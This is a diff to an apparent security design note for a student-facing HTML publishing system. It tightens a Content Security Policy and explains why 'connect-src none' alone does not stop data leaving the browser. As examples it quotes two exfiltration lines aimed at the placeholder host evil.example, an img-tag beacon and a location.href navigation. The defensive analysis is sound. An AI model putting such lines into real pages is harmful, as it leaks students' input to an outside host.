@@ -130,24 +130,38 @@ The CSP on the raw response is defence in depth:
 ```
 default-src 'none';
 script-src 'unsafe-inline' 'unsafe-eval' blob:;
-style-src 'unsafe-inline' https:;
-img-src data: blob: https:;
-font-src data: https:;
-media-src data: blob: https:;
+style-src 'unsafe-inline';
+img-src data: blob:;
+font-src data:;
+media-src data: blob:;
 connect-src 'none';
 frame-ancestors 'self';
 form-action 'none';
 base-uri 'none'
 ```
 
-`connect-src 'none'` is the line that earns its place: a page cannot make a
-network request, so nothing it collects can leave the browser.
+No directive admits `https:`. That is the point, and an earlier draft of this
+document got it wrong: it allowed `https:` on the passive directives and
+claimed `connect-src 'none'` meant "nothing it collects can leave the
+browser". It does not. `connect-src` governs fetch, XHR, WebSocket and beacon
+only — a subresource load is a real GET request, so `img-src https:` alone
+would let a hostile page exfiltrate whatever a student typed with
+`<img src="https://evil.example/log?d=answer">`. Closing the passive
+directives is what makes the guarantee true.
+
 `frame-ancestors 'self'` keeps other sites from embedding the page.
 
-Known limitation, accepted: `script-src` has no `https:`, so a page that loads a
-library from a CDN will not run. Self-contained files — what Jenn writes — are
-unaffected. If a page ever needs a CDN, that line gets relaxed as a decision
-rather than by accident.
+**Residual, accepted:** a sandboxed frame may navigate *itself*, so
+`location.href = "https://evil.example/?d=…"` still leaks. No CSP directive
+prevents it — `navigate-to` was never shipped. The sandbox does block
+navigating the top window and opening popups. The exposure is limited to data
+the student enters into that page; cookies, storage and the teacher session
+stay unreachable either way.
+
+Known limitation, accepted: nothing loads from a CDN — not scripts, not fonts,
+not images, not stylesheets. Self-contained files, which is what Jenn writes,
+are unaffected. Relaxing any of those lines is a decision to be taken
+deliberately, knowing it reopens the path above.
 
 There is no HTML sanitiser. Sanitising is the wrong tool here: it would strip
 exactly the scripts and handlers that make the page worth publishing, and the
